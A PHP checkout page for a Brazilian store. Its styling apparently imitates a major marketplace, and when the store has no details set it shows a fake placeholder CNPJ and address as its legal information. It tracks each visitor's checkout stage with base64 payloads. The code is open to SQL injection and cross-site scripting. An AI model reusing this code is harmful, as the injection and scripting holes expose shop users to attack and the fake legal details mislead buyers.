<?php
session_start();
require_once("api/db.php");
require_once("api/facebook_pixel.php");

if (!isset($_GET["produto"])) {
    session_destroy();
    header("Location: ./index");
    exit();
} else {
    $id = addslashes($_GET["produto"]);
    $sqlx = mysqli_query($conn, "SELECT * from produto WHERE codigo='$id'");

    if (($sqlx ? mysqli_num_rows($sqlx) : 0) > 0) {
        $_SESSION['session_index'] = time() + 1000;

        $sql = mysqli_query($conn, "SELECT * from config");
        $nome = "Minha Loja";
        $cor = "#ffe600";
        $cor_botao = "#3483fa";
        $endereco = "";
        $cnpj = "";
        while ($sql && $row = mysqli_fetch_array($sql)) {
            $nome = $row["nome"];
            $cor = $row["cor"];
            $cor_botao = isset($row["cor_botao"]) ? $row["cor_botao"] : "#3483fa";
            $endereco = isset($row["endereco"]) ? $row["endereco"] : "";
            $cnpj = isset($row["cnpj"]) ? $row["cnpj"] : "";
        }

        $sql1 = mysqli_query($conn, "SELECT * from produto WHERE codigo='$id'");
        $codigo = "";
        $nomeproduto = "";
        $valor = "0.00";
        $img = "";
        while ($sql1 && $row1 = mysqli_fetch_array($sql1)) {
            $codigo = $row1["codigo"];
            $nomeproduto = $row1["nome"];
            $valor = $row1["valor"];
            $img = $row1["img"];
        }

	        $valor_num = (float)str_replace(',', '.', str_replace('.', '', (string)$valor));
	        $_SESSION['session_checkout'] = time() + 1000;

	        // Disparar InitiateCheckout no Pixel
	        echo fb_pixel_event_script('InitiateCheckout', [
	            'content_ids' => [$codigo],
	            'content_name' => $nomeproduto,
	            'content_type' => 'product',
	            'value' => $valor_num,
	            'currency' => 'BRL'
	        ]);

        $logo_files = glob("arquivos/logo/*.png");
        $logo_loja = !empty($logo_files) ? $logo_files[0] : "";
    } else {
        session_destroy();
        header("Location: ./index");
        exit();
    }
}
?>
<!DOCTYPE html>
<html lang="pt-BR">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Carrinho - <?php echo htmlspecialchars($nome); ?></title>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
    <style>
        *, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
        :root {
            --store-yellow: <?php echo $cor; ?>;
            --store-blue: <?php echo $cor_botao; ?>;
            --store-bg-gray: #ebebeb;
            --store-text-dark: #333;
            --store-green: #00a650;
        }
        body { font-family: "Proxima Nova",-apple-system,Roboto,Arial,sans-serif; background-color: var(--store-bg-gray); color: var(--store-text-dark); -webkit-font-smoothing: antialiased; overflow-x: hidden; }

        /* Topo da loja */
        header { background-color: var(--store-yellow); padding: 8px 16px; position: sticky; top: 0; z-index: 100; }
        .header-content-wrapper { max-width: 1200px; margin: 0 auto; }
        .header-full { display: flex; flex-direction: column; gap: 8px; }
        .header-top-row { display: flex; align-items: center; justify-content: space-between; }
        .header-logo-full { height: 40px; object-fit: contain; }
        .icon-btn { font-size: 20px; color: #fff; cursor: pointer; }
        .search-row { width: 100%; }
        .search-input-box { background: #fff; border-radius: 4px; padding: 8px 12px; display: flex; align-items: center; box-shadow: 0 1px 2px rgba(0,0,0,0.1); }
        .search-text { color: #999; font-size: 14px; }
        .location-bar { background: var(--store-yellow); padding: 8px 16px; display: flex; align-items: center; gap: 8px; font-size: 13px; color: #333; border-top: 1px solid rgba(0,0,0,0.05); }

        /* FOOTER */
        .footer-main { background-color: #f5f5f5; border-top: 1px solid #e0e0e0; padding: 40px 20px 30px; margin-top: 60px; }
        .footer-content { max-width: 1200px; margin: 0 auto; }
        .footer-top { margin-bottom: 30px; }
        .footer-links-container { display: flex; flex-wrap: wrap; gap: 20px; margin-bottom: 25px; justify-content: center; }
        .footer-link { display: inline-block; font-size: 13px; color: #666; text-decoration: none; transition: color 0.2s ease; }
        .footer-link:hover { color: var(--store-blue); }
        .footer-bottom { border-top: 1px solid #ddd; padding-top: 20px; text-align: center; }
        .footer-copyright { font-size: 13px; color: #666; font-weight: 400; margin-bottom: 8px; }
        .footer-info { font-size: 12px; color: #999; font-weight: 400; line-height: 1.4; margin: 0; }
        @media (max-width: 768px) { .footer-main { padding: 30px 15px 20px; margin-top: 40px; } .footer-links-container { gap: 12px; justify-content: center; } .footer-link { font-size: 12px; display: inline-block; } .footer-copyright { font-size: 12px; text-align: center; } .footer-info { font-size: 11px; text-align: center; } }


        .container { width: 100%; max-width: 1200px; margin: 0 auto; padding: 12px; display: flex; flex-direction: column; gap: 12px; min-height: 60vh; }
        .card, .cart-content, .cart-summary { max-width: 1200px; margin-left: auto; margin-right: auto; }
        .card { background: #fff; border-radius: 4px; padding: 16px; box-shadow: 0 1px 2px rgba(0,0,0,0.1); width: 100%; }
        .full-badge { color: #00a650; font-weight: 700; font-size: 13px; margin-bottom: 12px; display: flex; align-items: center; gap: 4px; }

        .product-row { display: flex; flex-direction: column; gap: 12px; }
        .product-main { display: flex; gap: 12px; align-items: flex-start; }
        .product-img { width: 64px; height: 64px; object-fit: contain; border: 1px solid #eee; border-radius: 4px; flex-shrink: 0; }
        .product-info { flex: 1; min-width: 0; }
        .product-name { font-size: 14px; font-weight: 400; color: #333; text-decoration: none; line-height: 1.3; display: block; margin-bottom: 4px; }

        .product-controls { display: flex; justify-content: space-between; align-items: center; padding-top: 12px; border-top: 1px solid #f5f5f5; }
        .quantity-selector { display: flex; align-items: center; border: 1px solid #ddd; border-radius: 6px; overflow: hidden; height: 32px; }
        .qty-btn { background: #f5f5f5; border: none; width: 32px; height: 100%; cursor: pointer; font-size: 18px; color: var(--store-blue); }
        .qty-input { width: 36px; border: none; text-align: center; font-size: 14px; font-weight: 600; background: transparent; }
        .price-display { font-size: 18px; font-weight: 400; color: #333; }

        .product-actions { display: flex; gap: 15px; margin-top: 8px; }
        .action-link { color: var(--store-blue); font-size: 12px; text-decoration: none; background: none; border: none; cursor: pointer; }

        .summary-title { font-size: 18px; font-weight: 600; margin-bottom: 16px; }
        .summary-row { display: flex; justify-content: space-between; margin-bottom: 8px; font-size: 14px; color: #666; }
        .summary-total { display: flex; justify-content: space-between; margin-top: 12px; padding-top: 12px; border-top: 1px solid #eee; font-size: 18px; font-weight: 600; color: #333; }
        .btn-continue { display: flex; align-items: center; justify-content: center; width: 100%; height: 48px; background: var(--store-blue); color: #fff; border-radius: 6px; font-weight: 600; font-size: 16px; text-decoration: none; border: none; cursor: pointer; margin-top: 16px; }

        /* ===== RESPONSIVIDADE DESKTOP ===== */
        @media (min-width: 1200px) {
            .container { flex-direction: row; padding: 30px 20px; align-items: flex-start; gap: 30px; max-width: 1200px; margin: 0 auto; }
            .cart-content { flex: 2; max-width: calc(66.666% - 15px); }
            .cart-summary { flex: 1; position: sticky; top: 140px; max-width: calc(33.333% - 15px); }
            .product-row { flex-direction: row; align-items: center; justify-content: space-between; }
            .product-controls { border-top: none; padding-top: 0; gap: 20px; }
            .card { border-radius: 8px; box-shadow: 0 2px 8px rgba(0,0,0,0.1); max-width: 100%; }
        }

        /* ===== RESPONSIVIDADE TABLET ===== */
        @media (min-width: 769px) and (max-width: 1199px) {
            .container { flex-direction: row; padding: 20px 16px; align-items: flex-start; gap: 20px; }
            .cart-content { flex: 2; }
            .cart-summary { flex: 1; position: sticky; top: 120px; }
            .product-row { flex-direction: row; align-items: center; justify-content: space-between; }
            .product-controls { border-top: none; padding-top: 0; gap: 20px; }
        }

        /* ===== RESPONSIVIDADE MOBILE ===== */
        @media (max-width: 768px) {
            .container { flex-direction: column; padding: 12px 0; }
            .cart-content { flex: 1; }
            .cart-summary { flex: 1; width: 100%; position: static; }
            .product-row { flex-direction: column; }
            .product-controls { border-top: 1px solid #eee; padding-top: 12px; margin-top: 12px; }
            .card { margin: 0 0 8px 0; border-radius: 0; }
            .btn-continue { height: 44px; font-size: 15px; margin: 12px 12px 0; width: calc(100% - 24px); }
        }

        /* Rodapé padronizado */
        .footer { background: #fff; color: #666; font-size: 12px; padding: 18px 16px 22px; border-top: 1px solid #ddd; margin-top: 40px; }
        .footer-inner { max-width: 1200px; margin: 0 auto; }
        .footer-title { margin-bottom: 12px; font-size: 14px; color: #333; }
        .footer-links { display: flex; flex-wrap: wrap; gap: 12px; margin-bottom: 12px; }
        .footer-links a { color: #333; text-decoration: none; }

        /* Tela de carregamento */
        #store-loading-overlay {
            display: flex; /* Começa visível */
            position: fixed;
            inset: 0;
            width: 100%;
            height: 100%;
            background: #fff;
            z-index: 9999;
            flex-direction: column;
            align-items: center;
            justify-content: center;
        }
        .store-spinner {
            width: 50px;
            height: 50px;
            border: 3px solid #e6e6e6;
            border-top-color: var(--store-blue);
            border-radius: 50%;
            animation: store-spin .82s linear infinite;
        }
        .loader-message {
            margin-top: 22px;
            color: #333;
            font-size: 20px;
            font-weight: 400;
            line-height: 1.22;
            text-align: left;
        }
        @keyframes store-spin { to { transform: rotate(360deg); } }

        @media (max-width: 768px) {
            .loader-message { font-size: 18px; }
            .store-spinner { width: 48px; height: 48px; }
        }

        @media (max-width: 480px) {
            .loader-message { font-size: 16px; }
            .store-spinner { width: 44px; height: 44px; }
        }
    </style>
    <?php echo fb_pixel_base_code(); ?>

    <link rel="shortcut icon" href="arquivos/favicon.png?v=<?php echo time(); ?>">
    <link rel="icon" type="image/png" href="arquivos/favicon.png?v=<?php echo time(); ?>">
</head>
<body>
    <div id="store-loading-overlay">
        <div class="store-spinner"></div>
        <p class="loader-message">Estamos preparando<br>tudo para sua compra</p>
    </div>

    <header class="store-header-container checkout-header-simple">
      <div class="header-content-wrapper">
        <div style="display: flex; align-items: center; justify-content: center; padding: 12px 0;">
          <?php if(!empty($logo_loja)): ?>
            <img src="<?php echo $logo_loja; ?>" alt="<?php echo $nome; ?>" class="header-logo-full" style="max-height: 40px; object-fit: contain;">
          <?php else: ?>
            <span style="font-weight: bold; font-size: 18px;"><?php echo $nome; ?></span>
          <?php endif; ?>
        </div>
      </div>
    </header>

    <div class="container">
        <div class="cart-content">
            <div class="card">
                <div class="full-badge">
                    <i class="fa-solid fa-bolt"></i> FULL
                </div>
                <div class="product-row">
                    <div class="product-main">
                        <?php $img_src = (strpos($img, 'http') === 0) ? $img : "./arquivos/produtos/$codigo/$img"; ?>
                        <img src="<?php echo $img_src; ?>" class="product-img" id="checkoutProductImg">
                        <div class="product-info">
                            <div class="product-name" id="checkoutProductName"><?php echo htmlspecialchars($nomeproduto); ?></div>
                            <div id="checkoutVariacoes" style="font-size: 12px; color: #666; line-height: 1.4;"></div>
                            <div class="product-actions">
                                <button class="action-link">Excluir</button>
                                <button class="action-link">Mais tarde</button>
                            </div>
                        </div>
                    </div>
                    <div class="product-controls">
                        <div class="quantity-selector">
                            <button class="qty-btn" onclick="updateQty(-1)">-</button>
                            <input type="number" class="qty-input" value="1" id="cart-qty" readonly>
                            <button class="qty-btn" onclick="updateQty(1)">+</button>
                        </div>
                        <div class="price-display">
                            R$ <?php echo number_format($valor_num, 2, ',', '.'); ?>
                        </div>
                    </div>
                </div>
            </div>
        </div>

        <div class="cart-summary">
            <div class="card">
                <div class="summary-title">Resumo da compra</div>
                <div class="summary-row">
                    <span id="labelProdutos">Produtos (1)</span>
                    <span id="subtotalPrice">R$ 0,00</span>
                </div>
                <div class="summary-row">
                    <span>Envio</span>
                    <span style="color: #00a650;">Grátis</span>
                </div>
                <div class="summary-total">
                    <span>Total</span>
                    <span id="totalPrice">R$ 0,00</span>
                </div>
                <a href="confirm_address?produto=<?php echo $id; ?>" class="btn-continue" id="btnContinuarCompra">Continuar a compra</a>
            </div>
        </div>
    </div>

    <script>
        const valorUnitario = <?php echo (float)$valor_num; ?>;
        const codigoProduto = "<?php echo $codigo; ?>";

        function formatarMoeda(valor) {
            return valor.toLocaleString('pt-BR', { minimumFractionDigits: 2, maximumFractionDigits: 2 });
        }

        function atualizarResumo() {
            const qty = parseInt($('#cart-qty').val());
            const total = qty * valorUnitario;
            const totalFormatado = formatarMoeda(total);

            $('#labelProdutos').text(`Produtos (${qty})`);
            $('#subtotalPrice').text(`R$ ${totalFormatado}`);
            $('#totalPrice').text(`R$ ${totalFormatado}`);

            const data = JSON.parse(localStorage.getItem('lojavirtual') || '{}');
            data.quantos = qty;
            data.precoFinal = totalFormatado;
            localStorage.setItem('lojavirtual', JSON.stringify(data));

            const v_sel = JSON.parse(localStorage.getItem('variacoes_selecionadas') || '{}');
            $('#btnContinuarCompra').attr('href', 'confirm_address?produto=' + codigoProduto);
        }

        function updateQty(val) {
            let current = parseInt($('#cart-qty').val());
            let next = current + val;
            if (next >= 1 && next <= 2) {
                $('#cart-qty').val(next);
                atualizarResumo();
            }
        }

        $(document).ready(function() {
            // Esconde o spinner após o carregamento inicial simulado
            setTimeout(() => {
                $('#store-loading-overlay').fadeOut(300);
            }, 1200);

            let v_sel = JSON.parse(localStorage.getItem('variacoes_selecionadas') || '{}');
            const urlParams = new URLSearchParams(window.location.search);
            urlParams.forEach((v, k) => { if(k !== 'produto') v_sel[k] = v; });
            localStorage.setItem('variacoes_selecionadas', JSON.stringify(v_sel));

            if (v_sel.titulo_selecionado) $('#checkoutProductName').text(v_sel.titulo_selecionado);
            if (v_sel.imagem_selecionada) $('#checkoutProductImg').attr('src', v_sel.imagem_selecionada);

            let v_html = '';
            const skip = ['titulo_selecionado', 'imagem_selecionada', 'titulo', 'img'];
            Object.entries(v_sel).forEach(([k, v]) => {
                if (!v || skip.includes(k)) return;
                v_html += `<div>${k.charAt(0).toUpperCase() + k.slice(1)}: <strong>${v}</strong></div>`;
            });
            $('#checkoutVariacoes').html(v_html);

            atualizarResumo();

            // Spinner ao avançar
            $('#btnContinuarCompra').on('click', function(e) {
                e.preventDefault();
                const href = $(this).attr('href');
                $('#store-loading-overlay').fadeIn(200);
                setTimeout(() => {
                    window.location.href = href;
                }, 800);
            });
        });

        function sendOnline(etapa) {
            const ua = navigator.userAgent;
            const isMobile = /iPhone|iPad|Android|webOS|BlackBerry|iPod|Symbian|Windows Phone/i.test(ua);
            const dispositivo = isMobile ? "mobile" : "desktop";
            const payload = btoa(unescape(encodeURIComponent(JSON.stringify({
                api: "online",
                etapa: etapa,
                dispositivo: dispositivo
            }))));
            $.post("api/index.php", { p: payload });
        }

        $(document).ready(function() {
            sendOnline("checkout");
            setInterval(() => sendOnline("checkout"), 15000);
        });
    </script>

    <!-- FOOTER OFICIAL DA LOJA -->
    <footer class="footer-main">
      <div class="footer-content">
        <div class="footer-top">
          <div class="footer-links-container">
            <a href="politica-de-privacidade.php" class="footer-link">Política de Privacidade</a>
            <a href="termos-de-uso.php" class="footer-link">Termos de Uso</a>
            <a href="trocas-e-devolucoes.php" class="footer-link">Trocas e Devoluções</a>
            <a href="mailto:contato@<?php echo str_replace(' ', '', strtolower($nome)); ?>.com.br" class="footer-link">Contato</a>
          </div>
        </div>
        <div class="footer-bottom">
          <p class="footer-copyright">Copyright © <?php echo date('Y'); ?> <?php echo htmlspecialchars($nome); ?>. Todos os direitos reservados.</p>
          <p class="footer-info">CNPJ: <?php echo !empty($cnpj) ? htmlspecialchars($cnpj) : "00.000.000/0001-00"; ?> | Endereço: <?php echo !empty($endereco) ? htmlspecialchars($endereco) : "Av. Paulista, 1000 - São Paulo, SP"; ?></p>
        </div>
      </div>
    </footer>
</body>
</html>


